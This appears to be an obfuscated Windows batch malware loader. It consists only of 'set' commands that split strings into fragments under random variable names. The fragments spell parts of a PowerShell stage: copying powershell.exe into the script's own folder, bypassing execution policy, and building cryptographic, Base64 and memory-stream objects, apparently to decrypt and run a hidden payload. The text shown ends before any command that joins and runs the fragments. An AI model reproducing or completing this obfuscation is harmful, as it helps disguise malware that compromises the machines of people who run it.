@echo off
set "xYZuKdvKog=\W"
set "ONvutXnjnz=st"
set "QRfIeMXUYd=s\"
set "dJXgmqFBPH=xe"
set "qGFKsqvdEF=po"
set "InDXXHAgIL=nd"
set "vxGMLVZJHh=Po"
set "xNgZTCBiat=co"
set "gmQyMLWlqc=py"
set "iViYViuZTL=ll"
set "zOGyXhlEeQ=in"
set "yFEMTLFzwQ=rS"
set "GftjnqJOSC=we"
set "xBYzaPSTTa=\v"
set "nGfuSoUegI=:\"
set "UxQwEnmUcZ=y "
set "slchKJTByZ=he"
set "oagIfAhvFy=ow"
set "fplLDRiVTl=em"
set "QyjirhwPVJ=ll"
set "BHJzqJJrHI=we"
set "PhSHShwcIQ= /"
set "nOihchpRbz=ws"
set "gQnZqhnAcr= C"
set "FGkZXrmLgx=rs"
set "RhplBiFQfB=do"
set "wwqIIaciwl=Sy"
set "JGiFoRKyaf=32"
set "YtStanLQku=Wi"
set "OgomtCwGRL=0\"
set "pzmRqmCOOT=1."
set "RuDFvuBCzG=he"
set "TfYifKvGNa=.e"
set "wkUssSFEsU=cd"
set "lrJhjrYKZh= %~dp0"
set "mxjCxYmJZq=Syst"
set "qLAyTSJOhS=]::("
set "QUIpRwFcNc=IagQ"
set "trGqlFNxOP=; };"
set "qoLgqPziHF=e = "
set "kSOshspswx=ateD"
set "MWeocpPtNv=am;$"
set "RhIlQowSpE=ss -"
set "UNSAiKewDX=esMa"
set "JUUJpIHcya=oArr"
set "NPOANDBSoj=]::N"
set "QJOkVpDknw=]::C"
set "RHCKCGyYnf=New-"
set "wKcPLxhIuB=] -j"
set "xWsDpJYLCw=ay()"
set "QaTaQaSDun=$cae"
set "RZCMvPZKVs=lit("
set "dDUiRLyCIO=ect "
set "qARxoZqQGD=Mode"
set "azvDpNBbHo=File"
set "xTkemcccQV=BC ="
set "UMsBiGehhR=[]] "
set "OtHXfrmSCj=IIag"
set "FQULgAvLDj=brea"
set "nKKjPUnzdt=Stre"
set "MtbsolGjjL=[Sys"
set "RylpJTWmgT= '')"
set "yrrvHFNMSy== [S"
set "ZRqwvhhMUf=gQ.I"
set "cOWKOZCKtb=);$c"
set "slfnNaqdft=Obje"
set "EPvYnFRcVa=($Hs"
set "SgvxTzWwME=]::("
set "IbOVabfVfm= New"
set "ggdzmlEkrU=.Sec"
set "eCmjEOLnil= = N"
set "ABFFeiPFoH=zUZe"
set "HGuWIeevHP=$cae"
set "YzmZKhRarw=yTo("
set "cZImEXKOlR=bypa"
